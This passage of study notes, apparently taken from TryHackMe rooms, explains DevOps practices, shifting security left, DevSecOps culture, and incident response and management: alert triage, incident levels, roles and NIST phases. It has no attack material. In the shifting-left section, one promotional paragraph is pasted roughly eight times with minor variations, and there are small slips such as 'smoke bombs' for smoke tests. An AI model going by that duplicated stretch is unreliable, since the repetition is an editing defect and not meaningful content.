styles throughout the years and how these played a big part in the** inception of DevOps. This task will introduce you to key concepts, tools, and how they all work together.

# How does work?

DevOps

is

# visualized as an infinite loop, describing all the comprising phases:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/538ad9f777ec0153d5d648edd4bcf65a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/538ad9f777ec0153d5d648edd4bcf65a.png)

Following the infinite loop of the DevOps
 diagram, let's expand on some DevOps tools & processes that we'll 
look at as we follow the DevSecOps pathway and how they help an 
organization:

1. **CI/ CD** – In the previous task, we mentioned CI/CD (Continuous Integration and
Continuous
Deployment); CI/CD deals with the frequent merging of code and adding
testing in an automated manner to perform checks as new code is pushed
and merged. We can test code as we push and merge thanks to a new
dynamic and routine in deployment, which takes the form of minor code
changes systematically and routinely. Thanks to this change in dynamic,
CI/CD helps detect bugs early and decreases the effort of maintaining
modular code massively, which introduces
reliable rollbacks of versions/code.
2. **INFRASTRUCTURE AS CODE** (IaC) – a way to manage and provision infrastructure through code and
automation. Thanks to this approach, we can reuse code used to deploy
infrastructure (for example, cloud instances), which helps inconsistent
resource creation and management. Standard tools for IaC are terraform,
vagrant, etc. We will use these tools further in the pathway as we
experiment with IaC security.
3. **CONFIGURATION MANAGEMENT** – This is where the state of infrastructure is managed constantly and
applying changes efficiently, making it more maintainable. Thanks to
this, lots of time is saved, and more visibility into how infrastructure is configured. You can use IaC for configuration management.
4. **ORCHESTRATION** – Orchestration is the automation of workflows. It helps achieve
stability; for example, by automating the planning of resources, we can
have fast responses whenever there is a problem (e.g., health checks
failing); this can be achieved thanks to monitoring.
5. **MONITORING** – focuses on collecting data about the performance and stability of services and
infrastructure. This enables faster
recovery, helps with cross-team visibility, provides more data to
analyze for better root-cause analysis, and also generates an automated
response, as mentioned earlier.
6. **MICROSERVICES** – An architecture
that breaks an application into many small services. This has several
benefits, like flexibility if there is a need to scale, reduced
complexity, and more options for choosing technology across
microservices. We will look at these in more detail in the DevSecOps
pathway.

**Shifting Left**

# Introduction

Security can now be easily integrated because of the visibility and flexibility that DevOps introduces. You might have heard of the concept "Shifting Left." This means that  DevOps
 teams focus on instilling security from the earliest stages in the 
development lifecycle and introducing a more collaborative culture 
between development and security.

Since
 security can now be 
introduced early, risks are reduced massively. In the past, you would 
find out about security flaws and bugs at the very late stages, even in 
production. They are leading to stress, rollbacks, and economic losses. 
Integrating code analysis tools and automated tests earlier in the 
process can now identify these security flaws during early development.

# Shifting Left

In the past, security testing was implemented at the end of 
the development cycle. As the industry evolved and security functions were introduced, 
security teams would perform various analyses and security 
testing in the final stages of the lifecycle.

Depending on the results of security testing, it would either permit the application 
to proceed for deployment into production or reject the application and
 pass it back to developers for remediating the flaws identified. This resulted in long 
delays in development and friction between teams.

Implementing security measures during 
all stages of the development lifecycle (shifting left) rather than at 
the end of the cycle will ensure the software is designed with security 
best practices built in. By detecting security flaws early in 
development, remediation costs are lower, and there would be no need to 
roll back changes as they are being addressed on time. This reduces 
cost, builds trust, and improves the security and quality of the 
product.

# 

# Why are we shifting left

Back in the day, before agile,
 developers would request infrastructure from IT and receive servers 
weeks or months later. Nowadays, this provisioning of infrastructure in the cloud is automated. This
 shift has improved development productivity and speed. However, this 
increased velocity can also spark security concerns and lead to flaws 
that can go unnoticed.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/2078c48d1463aaf4245f2ed0d1175cab.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/2078c48d1463aaf4245f2ed0d1175cab.png)

The
 Shift-Left approach ensures these flaws are caught early by introducing
 processes from the start. In this fast-paced environment, 
post-development security reviews of new software versions or analysis 
of cloud infrastructure configurations become a bottleneck. Even when 
problems are discovered, there is not enough time to remediate them 
before the next version or feature is introduced. To keep up with 
customer needs, they need a fast-paced environment for scaling and 
growth. Security is at risk of being left behind; instilling security in
 the beginning and adapting security testing to become flexible and 
adapted to the development lifecycle increases the chances of addressing
 things promptly.

This development approach to shifting left in DevOps can be referred to as **DevSecOps.**

Yes, you heard it 
right. With DevOps, security gets introduced early in the 
development cycle, which minimizes risks massively. Integrating code 
analysis tools and automated tests earlier can lead to 
better identification and elimination of security loopholes. And as the 
software gets to the deployment stage, everything works smoothly as 
anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would enhance the impact of DevOps and 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now but certainly an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops)

Yes, you heard it 
right. With DevOps, security gets introduced early in the 
development cycle, which minimizes risks massively. Integrating code 
analysis tools and automated tests earlier can lead to 
better identification and elimination of security loopholes. And as the 
software gets to the deployment stage, everything works smoothly as 
anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would enhance the impact of DevOps and 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now but certainly an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops).

Yes, you heard it 
right. With DevOps, security gets introduced early in the 
development cycle, which minimizes risks massively. Integrating code 
analysis tools and automated tests earlier can lead to 
better identification and elimination of security loopholes. And as the 
software gets to the deployment stage, everything works smoothly as 
anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would not only enhance the impact of DevOps but also 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now but indeed an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops).

With DevOps, security 
gets introduced early in the development cycle, which minimizes 
risks massively. Integrating code analysis tools and automated tests 
earlier can lead to better identification and elimination
 of security loopholes. And as the software gets to the deployment 
stage, everything works smoothly as anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would not only enhance the impact of DevOps but also 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now but certainly an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops)

With DevOps, security 
gets to be introduced early in the development cycle and this minimizes 
risks massively. Integrating code analysis tools and automated tests 
earlier in the process can lead to better identification and elimination
 of security loopholes. And as the software gets to the deployment 
stage, everything works smoothly as anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would not only enhance the impact of DevOps but also 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now, but certainly an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops)

Yes, you heard it 
right. With DevOps, security gets to be introduced early in the 
development cycle and this minimizes risks massively. Integrating code 
analysis tools and automated tests earlier in the process can lead to 
better identification and elimination of security loopholes. And as the 
software gets to the deployment stage, everything works smoothly as 
anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would not only enhance the impact of DevOps but also 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now, but certainly an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops)

With DevOps, security 
gets to be introduced early in the development cycle and this minimizes 
risks massively. Integrating code analysis tools and automated tests 
earlier in the process can lead to better identification and elimination
 of security loopholes. And as the software gets to the deployment 
stage, everything works smoothly as anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would not only enhance the impact of DevOps but also 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now, but certainly an 
obligation.Read more at: [https://www.appknox.com/blog/history-of-devops](https://www.appknox.com/blog/history-of-devops)

With DevOps, security 
gets to be introduced early in the development cycle and this minimizes 
risks massively. Integrating code analysis tools and automated tests 
earlier in the process can lead to better identification and elimination
 of security loopholes. And as the software gets to the deployment 
stage, everything works smoothly as anticipated.

Security is not an add-on. It's a must-have design feature. Blending 
security in DevOps would enhance the impact of DevOps and 
eliminate a lot of other bottlenecks that could arise otherwise. With a 
rise in the frequency of cyber threats and tightening regulations, 
adding security to DevOps is not a choice now but indeed an 
obligation.Read more [here](https://www.appknox.com/blog/history-of-devops)

**DevSecOps: Security Strikes Back**

# DevSecOps

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/f008fcb933365fa95cc2f9acfa8ef443.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61a7523c029d1c004fac97b3/room-content/f008fcb933365fa95cc2f9acfa8ef443.png)

# 

DevSecOps is an approach that relies heavily on
automation and platform design that integrates security as a shared 
responsibility. It is a culture-driven development style that normalises security as a day-to-day operation.

# What is the value?

DevSecOps
 helps bring down 
vulnerabilities, maximises test coverage, and intensifies the automation
 of security frameworks. This reduces risk massively, assisting 
organisations in preventing brand reputation damage, and economic losses
 due to security flaws incidents, making life easier for auditing and 
monitoring.

# How to implement this efficiently?

Culture is key. It does not work without open communication and trust. It only works with collective effort. DevSecOps
 should aim to bridge the security knowledge gaps between teams; for 
everyone to think and be accountable for security, they first need the 
tools and knowledge to drive this autonomy efficiently and confidently.

# DevSecOps

**Security Silos**

It is common for many security teams to be left out of DevOps processes and portray security as a separate entity, where specialised 
people can only maintain and lead security practices. This situation creates a
 silo around security and prevents engineers from understanding the 
necessity of security or applying security measures from the beginning.

This is not scalable or flexible. Security should be a 
supportive function to help other teams scale and build security, 
without security teams being a blocker, but rather a ramp to promote 
secure solutions and decisions. The best practice is to share these 
responsibilities across
 all team members instead of having a specialised security engineer.

**Lack of Visibility & Prioritisation**

Aim to create a culture where security and other essential application 
components treat security as a regular aspect of the 
application. Developers can then focus on development with confidence 
about security instead of security departments playing police and the 
blame game. Trust should be built between teams, and security should 
promote the autonomy of teams by establishing processes that instil 
security.

**Stringent Processes**

Every new experiment or piece of software must not go through a 
complicated
 process and verification against security compliances before being used
 by developers. Procedures should be flexible to account for these 
scenarios, where lower-level tasks should be treated differently, and 
higher-risk tasks and changes are targeted for these more stringent 
processes.

Developers need environments to test new software without common 
security limitations. These environments are known as "SandBox," which
 are temporarily isolated environments. These 
environments have no connection to any internal network and have no 
customer data.

**DevSecOps Culture**

**DevSecOps**

# Promote autonomy of teams

Whether
 it is a large organization or a start-up in hypergrowth, the only way 
to not leave security behind is by promoting the autonomy of teams. This
 can be done by automating processes that fit seamlessly with the 
development pipeline until security tests become just another type of 
test, like unit testing, smoke bombs, etc.

Leading
 by example and promoting education like creating playbooks / runbooks 
to spot these flaws and fix them, understand their risk, and build 
confidence in engineers to make the secure decision independently. The 
ratio of developers, platform, infrastructure engineers, etc., won't be 
the same as security engineers, and we must understand they can't be in 
every conversation. Security should act as a supporting function that 
focuses on building trust and creating as much overlap in knowledge 
between teams as possible.

# Visibility and Transparency

For
 every tool being introduced or practised, there needs to be a 
supporting process that provides visibility and promotes transparency to
 other teams. This means that if we want to build autonomy in groups, as
 mentioned earlier, they need to have visibility on the security state 
of the service they own or maintain. For example, a dashboard visualizes
 the number of security flaws by the criticality of the service. This 
helps prioritize accordingly, so tasks don't get lost in the backlog or 
noise, and they can tackle flaws at the right time. The security state 
measure depends on the company, but it could be the number of high 
findings a service might or might not have which determine if it is in a
 good security state.

Transparency
 would refer to introducing tools and practices that are accessible to 
teams. For example, if you present a check before merging code, and the 
review doesn't pass and shows a message saying "signature of possible 
code injection flaw detected, please remediate," the developer or 
engineer should have access to the tool that is flagging that message. 
Usually, these analysis tools that flag those alerts have a UI that 
specifies the line in code where it's affected. They include a 
definition and a remediation suggestion with steps. In this example, a 
developer role can be created so that they have access to more 
information. This promotes education and autonomy by extending 
transparency that, traditionally, was only accessible by security teams.

# Account for flexibility thanks to understanding and empathy

As mentioned earlier, instilling security in DevOps
 processes with visibility and transparency is no easy task. There is a 
factor that can determine success: the level of understanding and 
empathy. This means that the definition of risk for security teams is 
unequivocal, but for other teams, risk can be different and just as 
precise for them. This doesn't only apply to risk but to an umbrella of 
things; it ramifies into what they prioritize, how they work, and what 
they think is important enough to leave aside a project with a tight 
deadline to fix a bug.

There
 is no magic tool or process for everyone. It is essential to understand
 how developers/engineers work, what they know to be a risk, and what 
they prioritize. If you know their perspective, it's easier to build a 
process that finds common ground and has a higher chance to work vs 
adding another tool that creates more noise and stress for everyone. 
This understanding builds perspective, which accounts for empathy for 
how other teams work and builds a process that accounts for flexibility.
 This is needed because every situation might be different, deadlines 
might be different, and bandwidth can change over time.

As a DevSecOps engineer, suppose you took the time to understand how a team owns a 
service. In that case, that will have a security scanner added to its 
development process, worked and viewed priority; it will be easier to 
get their buy-in and demonstrate value. For example, if it's a platform 
team and owns an internal service but a core service, a risk would be a 
bug that disrupts the service, not a potential injection that lives 
behind a proxy. You would need internal credentials to exploit it. You 
can tune the scanners or add a triaging process that tackles the 
questions they would ask themselves, and this would, in turn, build 
trust vs crying wolf and security processes being questioned.

Read about success stories .

## **INTRODUCTION TO INCIDENT RESPONSE ND INCIDENT MANAGEMENT**

**What is Incident Response and Management**

# What is a Cyber Incident?

Before
 diving into incident response and management, it is worth first talking
 about what a cyber incident is. We don't usually start with a cyber 
incident; there is a build-up before we get to this point.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/26b59b5363679f01caddcbde9f76c0a2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/26b59b5363679f01caddcbde9f76c0a2.png)

Usually,
 everything first starts at the SOC (Security Operations Centre). Here, a
 team of analysts monitor the security of the organisation. In essence, 
this team is monitoring

***events***

in the organisation's estate. If an event is an anomaly or unexpected, an

***alert***

is generated. Alerts can still be incorrect, thus these are then 
further investigated by the analysts. However, if the alert is real, the
 team will perform a triage process to determine the severity. If the 
severity of the alert is sufficient, an

***incident***

will be raised.

The
 SOC can therefore be seen as the filter. Not all events make it to 
incidents. For example, organisations often receive thousands of 
phishing emails every day. Most of these are automatically blocked by 
intrusion prevention systems such as their spam filter. Even if the user
 were to interact with most of these emails and execute malware, for 
example, the Anti Virus or Endpoint Detection and Response software 
would automatically block this. In these cases, an alert will be 
generated, and the SOC team will deal with it, such as updating mail 
filtering rules or signatures of the AV or EDR.

An incident, on 
the other hand, is when in the triage phase, we discover that there may 
still be further impact from the alert and when we don't have all

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/24038ac27be5cfac14434bece4c40e3d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/24038ac27be5cfac14434bece4c40e3d.png)

of
 the information required to deal with it. For example, let's say that 
an alert was generated that an anomalous logon occurred to one of our 
servers, we have quite several questions that still need answering:

1. Whose account was used?
2. Where did the logon occur from?
3. Where was that account being used before the logon?
4. Has there been any other potentially anomalous activity seen with that account?

If
 there is sufficient severity, the alert can be raised to an incident. 
Later, we will discuss the different levels of response to incidents.

# Incident Response and Management

When
 an alert's severity is high enough to become an incident, that is where
 Incident Response and Incident Management usually kick in. Often, these
 two are combined and simply called Incident Response. However, there 
are distinct features to both of these that are worth discussing.

**Incident Response**

Incident
 Response covers the technical aspect of dealing with an incident. This 
is the portion that is responsible for answering the primary question:

***What happened?***

To
 answer this question, the incident response team uses several 
techniques and technologies. These investigations often begin in the SOC
 by reviewing the information provided with the event that triggered the
 alert. This could be provided with one of the following tools:

- EDR or AV Alert - Usually these tools would create an alert for anomalous
activity that has occurred on a specific host. For example, the EDR
could alert that there were attempts made to monitor the keystrokes of a user.
- Network Tap Alert - Network taps provide alerts for
anomalous network activity. For example, there could be an alert that a
host is scanning other hosts in the estate.
- SIEM Alert - The
Security Information and Event Management (SIEM) system could alert on a custom rule that was created by the analysts. For example, an
impossible travel rule where a user's account is being logged in from
two different countries simultaneously.

When an alert is 
created, a lot of information is provided to the analyst. The first step
 is to investigate this information to better understand what is 
happening. In these systems, when an alert is generated, other key 
pieces of information are also attached to the alert. For example, in 
the case of the SIEM alert, the analyst would be able to review not only
 the latest logon events with the user's account, but the history of 
their logon events for the last couple of months.

However, 
sometimes the alert information is not sufficient and we have to gather 
more information than what is currently provided. This process is 
usually referred to as Digital Forensics. Here, we perform a much more 
hands-on investigation that can include the following:

- Recovering the hard disk from the infected host to investigate how the malware got on there in the first place.
- Recovering the data from volatile memory (such as from the computer's RAM) from
the infected host to investigate how the malware works.
- Recovering system and network logs from several devices to uncover how the malware spread.

The
 overall goal of Incident Response is to try and understand the scope of
 the incident. If we do not accurately understand the scope, the 
Incident Management process cannot take adequate steps to close off the 
incident. Both extremes can be incredibly damaging. If we misunderstand 
the scope to be larger than what it is, we could authorise more drastic 
actions than required, which would disrupt the business. If we 
misunderstand the scope to be smaller than what it is, we could take 
insufficient actions against the threat actor, meaning the incident 
would not be over.

**Incident Management**

Incident
 Management covers the process aspect of dealing with an incident. This 
is the portion that is responsible for answering the primary question:

***How do we respond to what happened?***

Once
 we understand the scope of the incident, the next question is how we 
will manage the incident. Incident Management has to take care of 
several things, such as:

- Triaging the incident to accurately
update the severity of the incident as new information becomes available and getting more stakeholders involved to help deal with the incident,
such as Subject Matter Experts (SMEs).
- Guiding the incident actions through the use of playbooks.
- Deciding which containment, eradication, and recovery actions will be taken to deal with the incident.
- Deciding the communication that will be sent internally and externally while the team deals with the incident.
- Documenting the information about the incident, such as the actions taken and the
effect that they had on dealing with the incident.
- Closing the incident and taking the information to learn from the incident and improve future processes and procedures.

Effective
 incident response and management are required to deal with an incident.
 It is often mistaken that only technical skills are required to deal 
with incidents. The management aspect is just as important. This will be
 discussed in more detail in Task 5.

# Levels of Incidents Response and Management

Just
 as not all alerts are equal, all incidents are also not equal. As such,
 the process of incident response and management will differ based on 
the severity of the incident. However, the severity is also not static 
and subject to change as incident response aids in better understanding 
the scope of the incident. As such, there are different levels of 
incident response and management. There are many different ways to 
classify the levels, and in each organisation, it will be unique. 
However, we will primarily focus on four different levels for this room.
 At each of these levels, we say a different team is invoked, meaning 
more important stakeholders get involved in the process. Furthermore, 
the actions available to deal with the incident become more powerful, 
but also more disruptive. The levels described here are what can be 
found in large organisations. For levels one to three, it is still the 
same SOC dealing with the incident, just the amount of team members 
involved in the incident.

**We will use an example in this case**: A user has reported a phishing email

**Level 1: SOC Incident**

At
 level one, these are often not even classified as incidents. Usually, 
these require a purely technical approach. At this level,  upon 
investigation of our example, the analyst finds that it is an isolated 
event and therefore simply updates the mail filtering rules to block the
 sender. These levels of incidents can happen several times a day and 
are usually quick to deal with and the analyst deals with this 
themselves.

However, in our example, a Computer Emergency 
Readiness Team (CERT) Incident may be invoked if the investigation found
 that several users received the email.

**Level 2: CERT Incident**

At
 level two, several analysts in the SOC may be involved in the 
investigation. A CERT Incident is one where we don't yet have enough to 
raise the alarm bells. Still, we are concerned and therefore performing 
additional investigation to determine the scope of the incident. 
Usually, the analyst would request assistance and more members of the 
SOC team would get involved. In our example, at this point, we would be 
investigating if any of those users interacted with the email. We would 
also like to better understand what the email does.

If we were 
able to stop the incident before any of the users interacted with the 
email, we would usually stop at this level. However, if we discover that
 the email contains malware and that some of the users actually 
interacted with the email, we would invoke a Computer Security Incident 
Response Team (CSIRT) incident.

**Level 3: CSIRT Incident**

At
 level three, the entire SOC is placed on high alert and actively 
working to resolve the incident. At this point, the entire SOC team will
 focus on the single incident to deal with it. Analysts and the forensic
 team work to uncover the full scope of the incident and the management 
team is taking action against the threat actor to contain the spread of 
the malware, eradicate it from hosts where it is discovered, and recover
 affected systems.

If the team is able to stop the spread of the 
attack before any disruptions can occur or the threat actor can escalate
 their privileges within the estate, the CSIRT team will close the 
incident. However, if it is determined that the scope is larger through 
investigation, we would invoke a Crisis Management Team (CMT) Incident.

**Level 4: CMT Incident**

At
 level four, it is all hands on deck and officially a full-scale cyber 
crisis. The CMT would usually consist of several key business 
stakeholders such as the entire executive suite, members from the legal 
and communication teams, as well as other external parties, such as the 
regulator or police. Furthermore, at this level, we start to move into 
the territory of what is called "nuclear" actions. Rather than simple 
actions to contain, eradicate, and recover, this team can authorise the 
use of nuclear actions, such as taking the entire organisation offline 
to limit the incident's damage.

# Benefits of Incident Response and Management

Building
 a team and everything required for Incident Response and Incident 
Management is not cheap. It is also often difficult to tangibly explain 
to a business why this is needed. However, the cost of an incident can 
be so severe that an organisation can completely close their doors after
 one. This also isn't just a "big company" problem. To put it in 
perspective, according to the [National CyberSecurity Alliance](https://staysafeonline.org/),
 roughly 60% of small companies that have suffered a cyber attack close 
their business after just six months. The importance of good incident 
response and management cannot be overstated.

**The Different Roles During an Incident**

Many
 roles are required to perform effective Incident Response and Incident 
Management. The table below covers some of these roles that you should 
familiarise yourself with:

| **Role** | **Description** |
| --- | --- |
| SOC Analyst | A
 SOC analyst is a person that deals with the various events and alerts 
that happen in the SOC. There are usually different levels of analysts. 
Ultimately, analysts are usually some of the first members that would 
get involved in dealing with an incident. |
| SOC Lead | The
 SOC lead, also called the SOC Manager or Head of SOC, is responsible 
for dividing the tasks in the SOC and deciding to escalate an alert to 
the level of incident. Usually, the SOC manager understands the 
technical information required to perform an investigation to better 
help them divide the different tasks during an incident. |
| Forensic Analyst | A
 forensic analyst is a person that performs an investigation to better 
understand what happened during an incident. This is often digital 
forensics that must be investigated by reviewing artefacts such as the 
memory or hard drive of a device. |
| Malware Analyst | A
 malware analyst is a forensic analyst who focuses on understanding how 
the malware works. These analysts often have significant technical 
capabilities to debug and decompile malware to understand how it works. 
These analysts often help to uncover Indicators of Compromise (IoCs) 
that are signatures of the malware that can be used to identify the 
malware in the environment. |
| Threat Hunter | A
 threat hunter is a person that actively tries to uncover new threats in
 the environment. The goal of threat hunting is to try and create new 
alert rules based on information available in logs and other sources. By
 performing threat hunting, an alert would be generated that could help 
the team discover an attacker that attempted to use the same technique. |
| First Responder | In
 certain cases, it isn't actually the SOC that is first alerted to an 
incident. Often, a cyber incident could have started as a business 
incident. For example, a product team discovers that their application 
has slowed down and isn't responding as it should. In these cases, that 
team becomes the First Responders to the incident. While they would not 
be expected to deal with the entire incident by themselves, there are 
some key steps that first responders should take to ensure that they 
don't compromise information that will be required to better understand 
the cyber incident. |
| Security Engineer | While
 security engineers are not directly involved with the SOC, they can 
often be involved in incidents. Security engineers are responsible for 
the security of their division, application, or system. In the event 
that there is an incident in their area, they will often be relied upon 
as a subject matter expert to aid in the investigation. Furthermore, 
security engineers will often work closely with the SOC to ensure that 
the SOC is receiving log information from their division. |
| Information Security Officer | Similar
 to a security engineer, an information security officer (ISO) is 
responsible for the security of their division. However, this is usually
 more management focussed than technical, such as security engineers. 
ISOs are also often involved in incidents as subject matter experts and 
responsible for acting as the bridge between the Incident Response team 
and their division team that will have to implement the actions provided
 by the Incident Manager. |
| Incident Manager | An
 incident manager is a person that was trained in performing the 
management duties for Incident Response and Management. Incident 
Managers have to be exceptional in note-taking and organised to ensure 
that everything during an incident is properly documented and that the 
processes are followed. |
| Project Owner | A
 product owner is usually the person that takes the lead during the 
development of a solution. In the past, with the waterfall method, 
products were only released after they were fully completed. However, 
today, using Agile processes, products are released and continuously 
updated. As such, since a version of the project is already live as the 
team is still performing development, incidents can already occur. In 
the event of an incident, the product owner is often called in as a 
subject matter expert to help with the investigation. |
| Subject Matter Expert | The
 blue team cannot be expected to be experts in every single technology 
or system. As such, Subject Matter Experts (SMEs) are often relied upon 
based on the specific incident at hand. For example, if, in the 
incident, Active Directory has been compromised, one of the Domain 
Admins could be called in as an SME. SMEs are often relied on to provide
 more information that allows the blue team to better understand the 
incident scope and what potential actions can be taken against the 
threat actors. |
| Crisis Manager | A crisis 
manager is the lead for the crisis management team. This is usually an 
executive such as the CIO or COO. This person is responsible for 
ensuring that the CMT functions as they should and can deal with the 
crisis. |
| Executive | In the event that
 an incident is sufficiently severe, executives of a company will be 
involved in the CMT. This includes the CEO, COO, CIO, CTO, and CISO. |

**The Process of Incident Management**

To
 effectively deal with an incident, a proper incident management process
 should be established. Although organisations often create their own 
process, it is usually based on the [NIST Incident Management](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf) process, as shown in the diagram below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dcab2ddeb05cd1300a0d2142d87b447e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dcab2ddeb05cd1300a0d2142d87b447e.png)

# Preparation

Preparation
 is key to effectively deal with an incident. During an incident, it is 
often stressful and every minute counts to ensure that the incident can 
be dealt with as fast as possible to reduce the amount of damage. In 
these stressful environments, it is often easy to forget things, which 
then could have severe consequences.

In order to prevent this, a 
team has to prepare to deal with an incident. The better the team is 
prepared, the less likely simple mistakes will be made during the 
incident. In order to prepare, there are several things that the team 
can perform, such as:

- Identify and document key stakeholders and call trees that will be used during an incident
- Create and update playbooks that aid the team in following a set process for incidents with a known nature
- Exercise the team's ability to deal with an incident through tabletop exercises and cyber war games
- Continuously perform threat hunting to help create new alert rules based on modern attacker techniques

# Detection and Analysis

Often
 organisations will split the detection and analysis phases into two. 
This is to introduce a middle step called triaging. As mentioned before,
 not all alerts will classify as an incident and even if an incident 
occur, there are different levels of incidents. The triage step is 
responsible for determining the severity of the incident. However, in 
the NIST framework, this is incorporated in this detection and analysis phase.

This
 is the primary phase for incident response, where we aim to answer the 
question of what has happened. During this phase, the blue team works to
 better understand the scope of the incident and provide this 
information to the incident manager. This can include actions such as 
the following:

- Reviewing alerts in the AV, EDR, and SIEM dashboards
- Performing a forensic investigation of artefacts both on systems and the network
- Analysing malware that is discovered to better understand how it works and create new signatures that can be used to identify it

# Containment, Eradication, and Recovery

Once
 the scope of the incident is better understood, the team will start 
with containment, eradication, and recovery. This is the primary phase 
of incident management, where we try to deal with the incident. Often 
organisations will split this phase into three different ones, each to 
deal with the following:

- Containment - Actions taken to "stop the bleed". These are actions meant to stop the incident from growing larger.
- Eradication - Actions taken to eradicate the threat actor from the estate.
- Recovery - Actions taken to recover the environment allow the organisation to go back to Business as Usual (BAU).

The
 reason these are split into three phases is because their order 
matters. If you start eradication or recovery before containment, the 
threat actor will be able to persist. For example, if the threat actor 
compromised Active Directory and we simply changed each account's 
password (eradication action), the threat actor could simply leverage 
their current permissions to recover the credentials again. We would 
first have to ensure that we have closed-off access to the threat actor 
before taking other actions.

As you will note in the diagram, 
phases 2 and 3 are cyclic. This is because when we start to deal with 
the incident, we will not understand the full scope. However, we also 
simply can't wait to understand the full scope before we start to take 
any action. Therefore, as the investigation is ongoing, we already start
 to take some actions and note the effect that they have on the 
incident. Only once we can return to BAU do we stop this process.

# Post-Incident Activity

Once an incident has been closed, that isn't the end of the incident 
management process. As a last step, we want to evaluate what happened 
during the incident in order to learn lessons and improve how we deal 
with incidents in the future. As such, we learn from these incidents to 
better prepare ourselves to deal with the next one.

**Common Pitfalls During an Incident**

Now
 that we have discussed Incident Response and Management, let's look at 
some common pitfalls that can happen during an incident.

# Insufficient Hardening

Insufficient
 Hardening is something that happens even before the incident. 
Organisations often prioritise speed and profits over security. 
Therefore, sometimes security can be seen as a hindrance for the 
organisation. Once a solution has been deployed, the organisation simply
 moves on to the next one. However, in security engineering, there is an
 important step called Hardening. Once a solution is deployed, there may
 still be some configurations that did not adhere to security best 
practices but were performed to get the solution up and running faster. 
The hardening process reverses these configurations to bring them back 
in line with security best practices.

In the event that this step 
is skipped, the likelihood of incidents is increased. This pitfall 
therefore results in an increased amount of incidents and while most can
 be stopped before there is actual damage, it only takes one successful 
incident to be very costly for an organisation. As such, the hardening 
step should not be skipped. To make it easier, organisations have 
started to perform Hardening during the development rather than simply 
at the end. This is known as the Shift Left principle and was discussed 
in the [Secure SDLC room.](https://tryhackme.com/jr/securesdlc)

# Insufficient Logging

In
 order for the blue team to be alerted to incidents, they first have to 
receive the relevant information that can result in events and alerts. 
Often it is seen that organisations are not performing adequate logging 
of information. This can be seen as "flying blind" since the blue team 
would not be able to even know that an incident is occurring.

A common problem is the cost of ingesting log information. Often SIEM
 providers will charge clients based on the amount of throughput of 
data. This then results in organisations limiting the amount of logs 
that are being ingested. Furthermore, it is often costly to have remote 
devices, such as ATMs, send their log information over a mobile network.
 All of this can lead to reduced visibility for the blue team. Although 
some of this log information will be available on the device itself, 
retention is often reduced and in worse cases, a threat actor might have
 removed these local logs.

In the event that there isn't 
sufficient logging, some incidents may only be detected later when there
 is already an impact. In other cases, it may not be possible to 
accurately determine the incident scope.

# Insufficient- and Over-Alerting

Sometimes we receive the logs, but we are not doing anything useful with them. SIEM
 solutions often ingest incredible amounts of data that can make it feel
 like investigators are looking for a needle in the haystack. This is 
why threat hunting is important. Threat hunting helps to identify 
information that can be converted into new alerts that would let the 
team know when there is something worth investigating.

However,
 the flip side can also be a problem. If an alert generates too much 
noise by having too many false positives, it can lead to the team 
ignoring the alert. This is similar to the "cry wolf" situation. In the 
event that an actual incident occurs raising an alert, the team could 
simply ignore it until there is a great impact. Threat hunting should 
therefore be careful not just to create new alerts, but to ensure that 
their signal-to-noise ratio is optimised.

# Insufficient Determination of Incident Scope

A
 big mistake that often happens during incident response and management 
is not understanding the incident scope. While it is often impossible to
 fully understand the incident scope, best efforts should be made. In 
cases where the incident scope is underestimated, the actions taken 
against the threat actor would not be sufficient to eradicate them from 
the system. In cases where the incident scope is overestimated, drastic 
actions could be taken by the team that would result in unnecessary 
business disruptions.

